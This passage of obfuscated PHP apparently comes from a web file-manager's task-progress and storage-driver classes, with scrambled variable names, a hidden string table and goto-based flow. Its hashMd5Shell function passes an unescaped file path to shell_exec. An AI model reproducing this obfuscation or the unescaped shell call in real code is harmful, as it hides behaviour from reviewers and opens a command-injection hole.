f©ïØ‘Ì¸; FŠİ³Ğ‚ç×: $c«ÒÈã¢ÜÆ[$Bö®¥ÇÏ×õ[1447]] = $f”Å¢»‚¯—; $c«ÒÈã¢ÜÆ[$Bö®¥ÇÏ×õ[1449]] = (int) $eßã¥±†ñ‹->size($E”•¸Á–Í); $c«ÒÈã¢ÜÆ[$Bö®¥ÇÏ×õ[1450]] = 0; goto B¼ÉİœĞäñ; Cºº¼°×²Í: } public function copyFileEnd($fœ‚ôô¨”¸, $a…ˆÉ¨‰à, $AÕ­Ç“³õ, $d‹ñí–™×Ü, $aƒ¯ªÜä‚è, $eÀ¤‰°äªÄ) { $AÄÍË‡Õã° =& $_SERVER[¼]; $Bàä×¨çÛª =& $this->task; $Bàä×¨çÛª[$AÄÍË‡Õã°[1450]] = $Bàä×¨çÛª[$AÄÍË‡Õã°[1449]]; $Bàä×¨çÛª[$AÄÍË‡Õã°[1451]] = $AÄÍË‡Õã°[33]; if ($aƒ¯ªÜä‚è == $Bàä×¨çÛª[$AÄÍË‡Õã°[1447]]) { $Bàä×¨çÛª[$AÄÍË‡Õã°[1454]] += $Bàä×¨çÛª[$AÄÍË‡Õã°[1449]]; $this->update(1); } else { $this->update(); $Bàä×¨çÛª[$AÄÍË‡Õã°[1450]] = 0; } self::log($AÄÍË‡Õã°[1459] . $a…ˆÉ¨‰à . $AÄÍË‡Õã°[66] . $d‹ñí–™×Ü . $AÄÍË‡Õã°[214] . $aƒ¯ªÜä‚è . $AÄÍË‡Õã°[1460] . $Bàä×¨çÛª[$AÄÍË‡Õã°[1447]]); } public function updateFileEnd($e¥ã–ø„Û¨, $DÒÂÉ´¤Ç) { $c—ù‡·Õ§· =& $_SERVER[¼]; $aòµ’î¾ =& $this->task; $aòµ’î¾[$c—ù‡·Õ§·[1447]] = $e¥ã–ø„Û¨; $aòµ’î¾[$c—ù‡·Õ§·[1449]] = $DÒÂÉ´¤Ç; $aòµ’î¾[$c—ù‡·Õ§·[1454]] += $DÒÂÉ´¤Ç; $this->update(1); } public function sourceModelCopy($D»öïÏíØŸ) { goto aô˜ºóâ; FÂÈ×£ÉóÜ: $b©òáÇË¾ =& $this->task; $this->sourceModelCopyFlag = !0; $F¡îË‰°¥‚ = 0; goto E¾ÙªÛâ¾‡; aô˜ºóâ: $EÎ†ŸäØÍç =& $_SERVER[¼]; $A±ñãŞ•‚‰ = $D»öïÏíØŸ[0]; $dåÍë„ª® = $D»öïÏíØŸ[1]; goto FÂÈ×£ÉóÜ; E¾ÙªÛâ¾‡: switch ($A±ñãŞ•‚‰) { case $EÎ†ŸäØÍç[503]: $F¡îË‰°¥‚ = 1; break; case $EÎ†ŸäØÍç[506]: $b©òáÇË¾[$EÎ†ŸäØÍç[1447]] = $dåÍë„ª®[$EÎ†ŸäØÍç[28]]; break; case $EÎ†ŸäØÍç[508]: $F¡îË‰°¥‚ = intval($D»öïÏíØŸ[$EÎ†ŸäØÍç[360]] * 0.4); break; case $EÎ†ŸäØÍç[510]: $F¡îË‰°¥‚ = intval($D»öïÏíØŸ[$EÎ†ŸäØÍç[360]] * 0.2); break; case $EÎ†ŸäØÍç[512]: $F¡îË‰°¥‚ = intval($D»öïÏíØŸ[$EÎ†ŸäØÍç[360]] * 0.4); break; } $this->update($F¡îË‰°¥‚); $this->sourceModelCopyFlag = !1; goto cÅ¤î›¥ÁÂ; cÅ¤î›¥ÁÂ: } public function sourceRemove($dîô¾¡ ¬ë, $eˆ´ÕÁ½‹¬) { $fÍ…Ï§‡ =& $_SERVER[¼]; $this->sourceModelCopyFlag = !0; $AØ£Š‘æ«¶ = 1; if (isset($dîô¾¡ ¬ë[$fÍ…Ï§‡[80]])) { $AØ£Š‘æ«¶ = $dîô¾¡ ¬ë[$fÍ…Ï§‡[80]][$fÍ…Ï§‡[78]] + $dîô¾¡ ¬ë[$fÍ…Ï§‡[80]][$fÍ…Ï§‡[79]] + 1; } $this->update($AØ£Š‘æ«¶); $this->sourceModelCopyFlag = !1; } public function sourceMove($F¯×èÕÏ÷) { $this->sourceRemove($F¯×èÕÏ÷, !1); } public function curlProgress($C…³š‹®¿İ, $F©³Ä¡ˆÀ, $CØèí¤²©Ò, $e¼‚æ¡¹¦, $Fëè½­ùÜ¥) { $eÌĞÛÓ›ß =& $_SERVER[¼]; $c‘«Ş®… =& $this->task; if ($Fëè½­ùÜ¥ > 0) { $c‘«Ş®…[$eÌĞÛÓ›ß[973]] = $eÌĞÛÓ›ß[1461]; $c‘«Ş®…[$eÌĞÛÓ›ß[1451]] = $eÌĞÛÓ›ß[91]; if ($c‘«Ş®…[$eÌĞÛÓ›ß[1449]] == $e¼‚æ¡¹¦ || $e¼‚æ¡¹¦ > 1024 * 1024) { $c‘«Ş®…[$eÌĞÛÓ›ß[1450]] = $Fëè½­ùÜ¥; } if ($c‘«Ş®…[$eÌĞÛÓ›ß[1452]]) { $c‘«Ş®…[$eÌĞÛÓ›ß[1450]] = $Fëè½­ùÜ¥ + $c‘«Ş®…[$eÌĞÛÓ›ß[1452]]; } } else { if ($CØèí¤²©Ò > 0) { if ($c‘«Ş®…[$eÌĞÛÓ›ß[1449]] == $F©³Ä¡ˆÀ) { $c‘«Ş®…[$eÌĞÛÓ›ß[1450]] = $CØèí¤²©Ò; $c‘«Ş®…[$eÌĞÛÓ›ß[973]] = $eÌĞÛÓ›ß[1462]; $c‘«Ş®…[$eÌĞÛÓ›ß[1451]] = $eÌĞÛÓ›ß[1033]; } } } $this->update(); } public function curlProgressStart($Cõ¦÷Ã§™Ï) { } public function curlProgressEnd($dôÖŠãÕ¨Ï) { $Eğõ…°À =& $_SERVER[¼]; $dŠàŠ‚¼ =& $this->task; $BÀ–Ö½‘ŒŸ = curl_getinfo($dôÖŠãÕ¨Ï); $eÇØ¤³‡… = $BÀ–Ö½‘ŒŸ[$Eğõ…°À[1463]]; if ($dŠàŠ‚¼[$Eğõ…°À[1451]] == $Eğõ…°À[91] && $eÇØ¤³‡…) { $dŠàŠ‚¼[$Eğõ…°À[1452]] += $eÇØ¤³‡…; } $this->update(); } } class TaskHttp extends Task { protected function startAfter() { $fÅîºĞ¢ßà =& $_SERVER[¼]; Hook::bind($fÅîºĞ¢ßà[1441], array($this, $fÅîºĞ¢ßà[1464])); Hook::bind($fÅîºĞ¢ßà[1443], array($this, $fÅîºĞ¢ßà[1465])); Hook::bind($fÅîºĞ¢ßà[1445], array($this, $fÅîºĞ¢ßà[1466])); } protected function endAfter() { $cŠàÊãè =& $_SERVER[¼]; Hook::unbind($cŠàÊãè[1441], array($this, $cŠàÊãè[1464])); Hook::unbind($cŠàÊãè[1443], array($this, $cŠàÊãè[1465])); Hook::unbind($cŠàÊãè[1445], array($this, $cŠàÊãè[1466])); } public function progressStart($Eƒ„¬˜£ŒÊ) { $b‹ß¤‰‘ä =& $_SERVER[¼]; $A–¿”¨¯¼‰ = curl_getinfo($Eƒ„¬˜£ŒÊ); self::log($b‹ß¤‰‘ä[1467] . $A–¿”¨¯¼‰[$b‹ß¤‰‘ä[292]]); self::valueSet($this->task[$b‹ß¤‰‘ä[364]], $this->task); } public function progressEnd($a†í¤É²¦Õ) { $C¸ê®ß‘ =& $_SERVER[¼]; self::log($C¸ê®ß‘[1468] . $this->task[$C¸ê®ß‘[364]]); $this->end(); } public function progress($f“´ùË±ÃÒ, $Fß¼ï¤Ó¨í, $eø¶£ˆÄ³, $D›ø‰ÄáÁª, $bÆ¹êÁí—») { $aƒŠŒÇ¨ß =& $_SERVER[¼]; $cŞÎÍ ƒ =& $this->task; if ($bÆ¹êÁí—» > 0) { $cŞÎÍ ƒ[$aƒŠŒÇ¨ß[971]] = $cŞÎÍ ƒ[$aƒŠŒÇ¨ß[971]] == 0 ? $D›ø‰ÄáÁª : $cŞÎÍ ƒ[$aƒŠŒÇ¨ß[971]]; $cŞÎÍ ƒ[$aƒŠŒÇ¨ß[983]] = $bÆ¹êÁí—»; } else { if ($eø¶£ˆÄ³ > 0) { $cŞÎÍ ƒ[$aƒŠŒÇ¨ß[971]] = $cŞÎÍ ƒ[$aƒŠŒÇ¨ß[971]] == 0 ? $Fß¼ï¤Ó¨í : $cŞÎÍ ƒ[$aƒŠŒÇ¨ß[971]]; $cŞÎÍ ƒ[$aƒŠŒÇ¨ß[983]] = $eø¶£ˆÄ³; } } $this->update(); self::log("\160\162\157\x67\x72\145\x73\163\110\x74\x74\160\72\144\157\x77\x6e\x3a{$eø¶£ˆÄ³}\57{$Fß¼ï¤Ó¨í}\x3b\40\x75\x70\154\157\141\144\x3a{$bÆ¹êÁí—»}\57{$D›ø‰ÄáÁª}\73"); } } goto C‰¸†õ„ëŒ; C³‹¼¶¬›Ñ: class PathDriverBase { public $pathDriver = ''; public $pathBase = ''; public $path = ''; public $pathID = ''; public function __construct() { $cÈÔª½Ÿº =& $_SERVER[¼]; $this->objectDriver = array($cÈÔª½Ÿº[57], $cÈÔª½Ÿº[58], $cÈÔª½Ÿº[59], $cÈÔª½Ÿº[60], $cÈÔª½Ÿº[61], $cÈÔª½Ÿº[62], $cÈÔª½Ÿº[63], $cÈÔª½Ÿº[64]); $this->_classObjectID = mt_rand(0, 10000); } public function getPath($d£”·ø£­) { if (in_array($this->getType(), $this->objectDriver)) { return ltrim($d£”·ø£­, $_SERVER[¼][8]); } return $d£”·ø£­; } public function getPathName($CãåŞÀ‚¸) { return $CãåŞÀ‚¸; } public function iconvApp($dÀõÔ¤™©) { return $dÀõÔ¤™©; } public function iconvSystem($B÷†µÓÖ¯) { return $B÷†µÓÖ¯; } public function iconvTo($f¬òÀ®·ğ, $D¹ßÚƒï‡‹, $F§é…êÒ‰´) { goto eÒˆÖ¨Û; díó¹óÑô: $aªë¬èîëÍ = $aªë¬èîëÍ ? $aªë¬èîëÍ : $f¬òÀ®·ğ; if (strstr($aªë¬èîëÍ, $D±èÅµ²ì[69])) { $aªë¬èîëÍ = str_replace($D±èÅµ²ì[69], $D±èÅµ²ì[70], $aªë¬èîëÍ); } $D£ß ƒù“[$D¹ßÚƒï‡‹ . $D±èÅµ²ì[66] . $F§é…êÒ‰´ . $D±èÅµ²ì[67] . $f¬òÀ®·ğ] = $aªë¬èîëÍ; goto F‡Òà¾Ìƒ; F‡Òà¾Ìƒ: $D£ß ƒù“[$F§é…êÒ‰´ . $D±èÅµ²ì[66] . $D¹ßÚƒï‡‹ . $D±èÅµ²ì[67] . $f¬òÀ®·ğ] = $f¬òÀ®·ğ; $D£ß ƒù“[$F§é…êÒ‰´ . $D±èÅµ²ì[66] . $D¹ßÚƒï‡‹ . $D±èÅµ²ì[67] . $aªë¬èîëÍ] = $f¬òÀ®·ğ; $D£ß ƒù“[$D¹ßÚƒï‡‹ . $D±èÅµ²ì[66] . $F§é…êÒ‰´ . $D±èÅµ²ì[67] . $aªë¬èîëÍ] = $aªë¬èîëÍ; goto E‡„…ñ¿Ó¡; E‡„…ñ¿Ó¡: return $aªë¬èîëÍ; goto DÒ²™¸òã”; C¤“©šÊÛö: $cî± ‘ßÎ… = $D¹ßÚƒï‡‹ . $D±èÅµ²ì[66] . $F§é…êÒ‰´ . $D±èÅµ²ì[67] . $f¬òÀ®·ğ; if (isset($D£ß ƒù“[$cî± ‘ßÎ…])) { return $D£ß ƒù“[$cî± ‘ßÎ…]; } if (function_exists($D±èÅµ²ì[68])) { $aªë¬èîëÍ = @mb_convert_encoding($f¬òÀ®·ğ, $F§é…êÒ‰´, $D¹ßÚƒï‡‹); } else { $aªë¬èîëÍ = @iconv($D¹ßÚƒï‡‹, $F§é…êÒ‰´, $f¬òÀ®·ğ); } goto díó¹óÑô; eÒˆÖ¨Û: $D±èÅµ²ì =& $_SERVER[¼]; if (!$f¬òÀ®·ğ || !function_exists($D±èÅµ²ì[65])) { return $f¬òÀ®·ğ; } static $D£ß ƒù“ = array(); goto C¤“©šÊÛö; DÒ²™¸òã”: } public function getPathInner($bòÙÍ£…†‹) { $c½¤¿îİ‡š = IO::init($bòÙÍ£…†‹); return $c½¤¿îİ‡š->path; } public function getPathOuter($DÊÉõ˜…§‹) { $cîåİ£Í«Ô =& $_SERVER[¼]; $dÅöÄÚŞ¡Å = strlen(trim($this->pathBase, $cîåİ£Í«Ô[8])); $DÊÉõ˜…§‹ = substr(trim($DÊÉõ˜…§‹, $cîåİ£Í«Ô[8]), $dÅöÄÚŞ¡Å); return $this->pathDriver . $cîåİ£Í«Ô[8] . ltrim($DÊÉõ˜…§‹, $cîåİ£Í«Ô[8]); } public function isParentOf($CáöŸ—òº, $fØˆóëîÅŒ) { $d®Âµùˆ‘ =& $_SERVER[¼]; $CáöŸ—òº = rtrim(strtolower($CáöŸ—òº), $d®Âµùˆ‘[8]) . $d®Âµùˆ‘[8]; $fØˆóëîÅŒ = rtrim(strtolower($fØˆóëîÅŒ), $d®Âµùˆ‘[8]) . $d®Âµùˆ‘[8]; $fÎÅ³ĞõÑ‹ = strpos($fØˆóëîÅŒ, $CáöŸ—òº) === 0; return $fÎÅ³ĞõÑ‹; } public function getType() { $C’œ®µ†´± =& $_SERVER[¼]; $b¥ØÑÓœ¯ = str_replace($C’œ®µ†´±[71], $C’œ®µ†´±[33], get_class($this)); return strtolower($b¥ØÑÓœ¯); } public function isTypeObject() { if (!is_array($this->objectDriver)) { return !1; } return in_array($this->getType(), $this->objectDriver); } public function fileNameExist($fñÕ³÷«ŞŒ, $fÇöÏŞ‘¡Ü) { $B†àó×‰¯‡ =& $_SERVER[¼]; $e¢ó÷›ˆÑÒ = rtrim($fñÕ³÷«ŞŒ, $B†àó×‰¯‡[8]) . $B†àó×‰¯‡[8] . $fÇöÏŞ‘¡Ü; $FÃ÷Õ®·ƒ = $this->exist($e¢ó÷›ˆÑÒ); return $FÃ÷Õ®·ƒ ? $e¢ó÷›ˆÑÒ : !1; } public function renameObject($e¤åèá†„ğ, $aõÛ½ŠƒØ˜) { goto CëêŠÑ¦; CëêŠÑ¦: $e¤ó˜Ö‘Äï =& $_SERVER[¼]; $CòƒÖ§ãô = $aõÛ½ŠƒØ˜; Hook::trigger($e¤ó˜Ö‘Äï[72], $this, $e¤åèá†„ğ, $this, $this->pathFather($e¤åèá†„ğ) . $aõÛ½ŠƒØ˜); goto eö×Ââ¥Õ¿; eö×Ââ¥Õ¿: $e¤åèá†„ğ = $this->getPathOuter($e¤åèá†„ğ); $aõÛ½ŠƒØ˜ = $this->pathFather($e¤åèá†„ğ) . $aõÛ½ŠƒØ˜; if (IO::isFile($e¤åèá†„ğ)) { $aÚ»æ¶òŠ› = IO::copy($e¤åèá†„ğ, $this->pathFather($e¤åèá†„ğ), REPEAT_RENAME_FOLDER, $CòƒÖ§ãô); if ($aÚ»æ¶òŠ›) { IO::remove($e¤åèá†„ğ); } } else { $aÚ»æ¶òŠ› = IO::mkdir($aõÛ½ŠƒØ˜); if (!$aÚ»æ¶òŠ›) { return !1; } $FÜ‹±‘ªç© = IO::listPath($e¤åèá†„ğ, !0); $FËƒ«¦âƒÍ = array_merge($FÜ‹±‘ªç©[$e¤ó˜Ö‘Äï[73]], $FÜ‹±‘ªç©[$e¤ó˜Ö‘Äï[74]]); foreach ($FËƒ«¦âƒÍ as $CÓè§¶£ÒÌ) { IO::move($CÓè§¶£ÒÌ[$e¤ó˜Ö‘Äï[75]], $aõÛ½ŠƒØ˜, REPEAT_RENAME_FOLDER); } IO::remove($e¤åèá†„ğ); } goto d ¿†¤¡¡; d ¿†¤¡¡: return $aÚ»æ¶òŠ› ? $aõÛ½ŠƒØ˜ : !1; goto CóìÛÙÊÀˆ; CóìÛÙÊÀˆ: } public function tempFile($CÎÆ²»²ñ× = '', $cŞâ‘Œ æ = '') { goto Fƒ‹à»íŞÑ; Fƒ‹à»íŞÑ: if (!$CÎÆ²»²ñ×) { $CÎÆ²»²ñ× = rand_string(15); } $F…ˆØİ“¡İ = TEMP_FILES . rand_string(15) . $_SERVER[¼][8]; @mkdir($F…ˆØİ“¡İ, 511, !0); goto D†ÎöİÁ÷¥; D†ÎöİÁ÷¥: $E´‚ÎÖé³ = $F…ˆØİ“¡İ . $CÎÆ²»²ñ×; @touch($E´‚ÎÖé³); if ($cŞâ‘Œ æ) { file_put_contents($E´‚ÎÖé³, $cŞâ‘Œ æ); } goto fç’À¢àóÚ; fç’À¢àóÚ: return $E´‚ÎÖé³; goto EÎ“¹çÒŸ‚; EÎ“¹çÒŸ‚: } public function tempFileRemve($D‰îù¡Å×) { @unlink($D‰îù¡Å×); @rmdir($this->pathFather($D‰îù¡Å×)); } public function mkfile($aÆ‘”…™–Š, $b¾ÁÚøÅ²ƒ = '', $EóÅÏÓğ“ = REPEAT_RENAME) { } public function mkdir($dÑÄ‘øõ«, $dµÏŒàæ”Å = REPEAT_SKIP) { } public function copyFile($e¿š˜‚¸±˜, $cÍ‡·‹ˆ¡) { } public function moveFile($a–¸‚Ö±¸º, $f†Âºß¶”Ê) { } public function remove($EĞõ÷£¬Ö) { if ($this->isFile($EĞõ÷£¬Ö)) { return $this->delFile($EĞõ÷£¬Ö); } return $this->delFolder($EĞõ÷£¬Ö); } public function rename($f±¨®áƒ±¨, $e¹Ì±¬™å) { } public function exist($EÃ¨ĞÜ£¡) { } public function findByHash($E‰¦···¸ = '', $EÔ•Õ®çÉ = '') { return !1; } public function isFile($DìÂÆ×·³ƒ) { } public function isFolder($b™‰¾àù†‡) { } public function size($B»øÀí‡·Ä) { } public function info($b‹Ùµï–š‚) { } public function infoSimple($B¨–Œ†‡ğ‘) { return $this->info($B¨–Œ†‡ğ‘); } public function infoAuth($cœ‡ğ²ÑÉ) { return $this->info($cœ‡ğ²ÑÉ); } public function infoFull($DÙ“©Ñİ¢) { return $this->info($DÙ“©Ñİ¢); } public function infoWithChildren($fÆ·ºœœÎÄ) { $aˆ–Ñ„¿³ =& $_SERVER[¼]; $E«‘‘­×àÍ = $this->info($fÆ·ºœœÎÄ); if ($E«‘‘­×àÍ && $E«‘‘­×àÍ[$aˆ–Ñ„¿³[29]] == $aˆ–Ñ„¿³[76]) { $aİ„¹â³ß› = array($aˆ–Ñ„¿³[77] => 0, $aˆ–Ñ„¿³[78] => 0, $aˆ–Ñ„¿³[79] => 0); $this->infoChildren($fÆ·ºœœÎÄ, $aİ„¹â³ß›); $E«‘‘­×àÍ[$aˆ–Ñ„¿³[77]] = $aİ„¹â³ß›[$aˆ–Ñ„¿³[77]]; $E«‘‘­×àÍ[$aˆ–Ñ„¿³[80]] = array($aˆ–Ñ„¿³[81] => $aİ„¹â³ß›[$aˆ–Ñ„¿³[78]], $aˆ–Ñ„¿³[82] => $aİ„¹â³ß›[$aˆ–Ñ„¿³[79]]); } return $E«‘‘­×àÍ; } public function listPath($bÛİ‚»¼Ã†, $cÎ§òªŒøŸ = false) { } public function has($c•³ÄˆµÍ›, $FïŠ¨İöÜ« = false, $e‚„—êà„Ø = false) { } public function canRead($AÉ¨ˆ°¾Éë) { } public function canWrite($Dê¼¸ô‚) { } public function getContent($dœÜóÒ¾ª†) { } public function setContent($CğĞÓ‰×±ˆ, $cìö¢¯¥ËÊ = '') { } protected function infoChildren($fáÔ«Ÿğ«¸, &$EíâöùÚ§‰) { $aË¼ø¥³„ =& $_SERVER[¼]; check_abort(); $F‹±ÛœêÔ = $this->listPath($fáÔ«Ÿğ«¸, !0); $F‹±ÛœêÔ = array_merge($F‹±ÛœêÔ[$aË¼ø¥³„[74]], $F‹±ÛœêÔ[$aË¼ø¥³„[73]]); foreach ($F‹±ÛœêÔ as $DÖ„¡ÖŸô˜) { if ($DÖ„¡ÖŸô˜[$aË¼ø¥³„[29]] == $aË¼ø¥³„[76]) { $EíâöùÚ§‰[$aË¼ø¥³„[79]]++; $EÜğšğÒï = $this->getPathInner($DÖ„¡ÖŸô˜[$aË¼ø¥³„[75]]); $this->infoChildren($EÜğšğÒï, $EíâöùÚ§‰); } else { $EíâöùÚ§‰[$aË¼ø¥³„[78]]++; $EíâöùÚ§‰[$aË¼ø¥³„[77]] += $DÖ„¡ÖŸô˜[$aË¼ø¥³„[77]]; } } } public function fileSubstr($d“¾¬Ï—, $BÔ‘Ñ‹äë, $f½š¢«´¡Ø) { } public function listAll($f·ç¬‡) { } public function upload($EóÒ›áÖ, $Eó¶œÃòâ, $eŠ„Óâ½Ÿ = false, $c›˜šéÎ = REPEAT_REPLACE) { } public function uploadFileByID($dœ¦±ïÔ, $fù¨…ÑÅ­, $Eò„š ŒŒ) { } public function uploadFileByPath($EèÎ‡§Ğ¦É, $d­ä…‡ºÖÚ, $A¡İ˜­ = array()) { } public function isUploadServer() { $d»µ‰ŠÛ‡÷ =& $_SERVER[¼]; if (isset($this->ioUploadServer) && $this->ioUploadServer == $d»µ‰ŠÛ‡÷[83]) { return !0; } return $GLOBALS[$d»µ‰ŠÛ‡÷[6]][$d»µ‰ŠÛ‡÷[84]][$d»µ‰ŠÛ‡÷[85]]; } public function isFileOutServer() { $Bôß±­¿ô¤ =& $_SERVER[¼]; if (isset($this->ioFileOutServer) && $this->ioFileOutServer == $Bôß±­¿ô¤[83]) { return !0; } return $GLOBALS[$Bôß±­¿ô¤[6]][$Bôß±­¿ô¤[84]][$Bôß±­¿ô¤[86]]; } public function isCdnHost() { return $this->isFileOutServer() || empty($this->cdnHost) ? !1 : !0; } public function getCdnLink($AÃîÚËˆÉ¾) { $Fš‡ÂÁ¹ˆ =& $_SERVER[¼]; if (!$this->isCdnHost()) { return $AÃîÚËˆÉ¾; } return str_replace(trim(get_url_root($AÃîÚËˆÉ¾), $Fš‡ÂÁ¹ˆ[8]), trim($this->cdnHost, $Fš‡ÂÁ¹ˆ[8]), $AÃîÚËˆÉ¾); } public function uploadLink($AùæïêÕ™ì, $fºç„©ï = 0) { goto BÃ¾¤ó‡Ó; BÃ¾¤ó‡Ó: $d“âĞ÷ƒ‰ =& $_SERVER[¼]; if ($this->isUploadServer()) { return; } $dñÍÛçÊ‰¬ = $this->getType(); goto d¸†Ôè¾Ô; d¸†Ôè¾Ô: if (!in_array($dñÍÛçÊ‰¬, $this->objectDriver)) { return; } if (!$this->isBucketCors()) { return; } $A…‡‹ğ‡Š‚ = 1024 * 1024 * 10; goto DÁƒ ¹–„‚; fçÛ·´Æ·˜: if ($eÑ¶Š¤Íïå) { $eÑ¶Š¤Íïå[$d“âĞ÷ƒ‰[89]] = $AùæïêÕ™ì; $eÑ¶Š¤Íïå[$d“âĞ÷ƒ‰[90]] = $dñÍÛçÊ‰¬; } return $eÑ¶Š¤Íïå; goto CÈ¹Ğ« ; DÁƒ ¹–„‚: $DÕµ•‹êµ = $fºç„©ï <= $A…‡‹ğ‡Š‚ ? $d“âĞ÷ƒ‰[87] : $d“âĞ÷ƒ‰[88]; $f³Ô§îØ¶½ = (!$fºç„©ï ? 1 : ceil($fºç„©ï / pow(1024, 3))) * 3600 * 4; $eÑ¶Š¤Íïå = $this->{$DÕµ•‹êµ}($AùæïêÕ™ì, $f³Ô§îØ¶½); goto fçÛ·´Æ·˜; CÈ¹Ğ« : } public function uploadFormData($c»°ó†‡, $D•¥ÀÔ†“ç = 3600) { } public function multiUploadFormData($DéîºÔ§“, $eÇ¶‰ˆä¨¹ = 3600) { } public function osChunkSize() { $bÀïÏ²ßòæ =& $_SERVER[¼]; $a”“Ò“Ò‹Ø = (double) $GLOBALS[$bÀïÏ²ßòæ[6]][$bÀïÏ²ßòæ[84]][$bÀïÏ²ßòæ[91]][$bÀïÏ²ßòæ[92]]; if (!$a”“Ò“Ò‹Ø) { $a”“Ò“Ò‹Ø = 1024 * 84 * 10; } return $a”“Ò“Ò‹Ø; } public function download($Eè‚ª†Ùö, $BãñĞ¥šá¶) { } public function ext($d¹æñè™Äè) { $B©¨Ìñİ×à =& $_SERVER[¼]; if (strpos($d¹æñè™Äè, $B©¨Ìñİ×à[8]) === -1) { $a¼ÑÈ¢‚³® = $d¹æñè™Äè; } else { $a¼ÑÈ¢‚³® = $this->pathThis($d¹æñè™Äè); } $Céº‰¢âÉ = $B©¨Ìñİ×à[33]; if (strstr($a¼ÑÈ¢‚³®, $B©¨Ìñİ×à[93])) { $Céº‰¢âÉ = substr($a¼ÑÈ¢‚³®, strrpos($a¼ÑÈ¢‚³®, $B©¨Ìñİ×à[93]) + 1); $Céº‰¢âÉ = strtolower($Céº‰¢âÉ); } if (strlen($Céº‰¢âÉ) > 3 && preg_match($B©¨Ìñİ×à[94], $Céº‰¢âÉ, $fª–ÂÀ”ñ)) { $Céº‰¢âÉ = $B©¨Ìñİ×à[33]; } return $Céº‰¢âÉ; } public function pathThis($fÊ¥­î„Ù—) { $e¯Ö®½ñÎ™ =& $_SERVER[¼]; $fÊ¥­î„Ù— = str_replace($e¯Ö®½ñÎ™[95], $e¯Ö®½ñÎ™[8], rtrim($fÊ¥­î„Ù—, $e¯Ö®½ñÎ™[8])); $aÎ¥«ã‘÷Ù = strrpos($fÊ¥­î„Ù—, $e¯Ö®½ñÎ™[8]); if ($aÎ¥«ã‘÷Ù === !1) { return $fÊ¥­î„Ù—; } return substr($fÊ¥­î„Ù—, $aÎ¥«ã‘÷Ù + 1); } public function pathFather($eéˆá ÌµÅ) { $DõØ¢¼Õ =& $_SERVER[¼]; $eéˆá ÌµÅ = str_replace($DõØ¢¼Õ[95], $DõØ¢¼Õ[8], rtrim($eéˆá ÌµÅ, $DõØ¢¼Õ[8])); $AÔ­ïÇ¥Í = strrpos($eéˆá ÌµÅ, $DõØ¢¼Õ[8]); if ($AÔ­ïÇ¥Í === !1) { return $DõØ¢¼Õ[33]; } return substr($eéˆá ÌµÅ, 0, $AÔ­ïÇ¥Í + 1); } public function hashSimple($B¡ŒÀ‡ğÖ‘) { goto e«²Ò–ÕÓÀ; e«²Ò–ÕÓÀ: $cÅÍƒ¸¡¾š =& $_SERVER[¼]; if (!$B¡ŒÀ‡ğÖ‘) { return md5($cÅÍƒ¸¡¾š[33]); } $Eìİó¯Ôˆ = $this->size($B¡ŒÀ‡ğÖ‘); goto D™â¢Â‹; D™â¢Â‹: $d‘§µ×©æÀ = 200; $C¼…¡ÔİéÀ = 50; if ($Eìİó¯Ôˆ <= $d‘§µ×©æÀ * $C¼…¡ÔİéÀ) { return $this->hashMd5($B¡ŒÀ‡ğÖ‘) . $Eìİó¯Ôˆ; } goto aõÊñÅáœ•; aõÊñÅáœ•: $fÎä·“³ = intval($Eìİó¯Ôˆ / $C¼…¡ÔİéÀ); $A£í÷¹ÉÎ… = $cÅÍƒ¸¡¾š[33]; for ($c‚ÑÇ†Ô¡ = 0; $c‚ÑÇ†Ô¡ < $C¼…¡ÔİéÀ; $c‚ÑÇ†Ô¡++) { $A£í÷¹ÉÎ… .= $this->fileSubstr($B¡ŒÀ‡ğÖ‘, $fÎä·“³ * $c‚ÑÇ†Ô¡, $d‘§µ×©æÀ); } goto D‰Ë‡ìá±; D‰Ë‡ìá±: $A£í÷¹ÉÎ… .= $this->fileSubstr($B¡ŒÀ‡ğÖ‘, $Eìİó¯Ôˆ - $d‘§µ×©æÀ, $d‘§µ×©æÀ); return md5($A£í÷¹ÉÎ…) . $Eìİó¯Ôˆ; goto fĞŒëõ‹å„; fĞŒëõ‹å„: } public static $md5Cache = array(); public function hashMd5($E¿Û³ß·½³) { $E¿Û³ß·½³ = $this->iconvSystem($E¿Û³ß·½³); if (isset(self::$md5Cache[$E¿Û³ß·½³])) { return self::$md5Cache[$E¿Û³ß·½³]; } self::$md5Cache[$E¿Û³ß·½³] = $this->hashMd5Shell($E¿Û³ß·½³); if (!self::$md5Cache[$E¿Û³ß·½³]) { self::$md5Cache[$E¿Û³ß·½³] = @md5_file($E¿Û³ß·½³); } return self::$md5Cache[$E¿Û³ß·½³]; } private function hashMd5Shell($DÊ·œÓøé ) { goto BÉíæ…–§‘; FáÂœƒÜƒ: $B‹µá¬ É = shell_exec($bòÒ–­µª… . "\40\42{$DÊ·œÓøé }\x22"); return substr($B‹µá¬ É, 0, 32); goto bÙ“Ø½š°; BÉíæ…–§‘: $døĞ…ÍçİÈ =& $_SERVER[¼]; if (!function_exists($døĞ…ÍçİÈ[96])) { return !1; } $añ…Ô·éõ = array($døĞ…ÍçİÈ[97], $døĞ…ÍçİÈ[98]); goto Eâì›É¼¢; Eâì›É¼¢: $bòÒ–­µª… = Cache::get($døĞ…ÍçİÈ[99]); if (!$bòÒ–­µª…) { $c††Æ³øî = BASIC_PATH . $døĞ…ÍçİÈ[100]; $cĞŸ«ô’ = md5_file($c††Æ³øî); $bòÒ–­µª… = $døĞ…ÍçİÈ[101]; foreach ($añ…Ô·éõ as $B¸©•ÔÒ¦ã) { $B‹µá¬ É = shell_exec($B¸©•ÔÒ¦ã . "\40\42{$c††Æ³øî}\42"); if ($B‹µá¬ É && substr(trim($B‹µá¬ É), 0, 32) == $cĞŸ«ô’) { $bòÒ–­µª… = $B¸©•ÔÒ¦ã; break; } } Cache::set($døĞ…ÍçİÈ[99], $bòÒ–­µª…, 3600); } if ($bòÒ–­µª… == $døĞ…ÍçİÈ[101]) { return !1; } goto FáÂœƒÜƒ; bÙ“Ø½š°: } public function link($EĞé‰´†á) { return $EĞé‰´†á; } public function fileOut($c¹ñÄ½»‰, $f°”ÉŠŠ‡ = false, $Bá­°îï÷ë = false, $CÙ¤÷†‡›¦ = '') { goto AÆÁÃ·²£ç; FÅ¢×ÂŒ´Í: $b¶°Á»ê£¶ = 0; if ($eÕÉ™¥˜ ¨) { $b¶°Á»ê£¶ = intval(1000 * 1000 * ($CĞáÓ©ÛìÑ / $eÕÉ™¥˜ ¨)); } while ($F›‡ÁÅŒ™à <= $a¤ÑÈƒ«±) { $f¸ÈœÑê = timeFloat(); check_abort(); $b©äœŠ¹ÂÎ = $a¤ÑÈƒ«± - $F›‡ÁÅŒ™à + 1; if 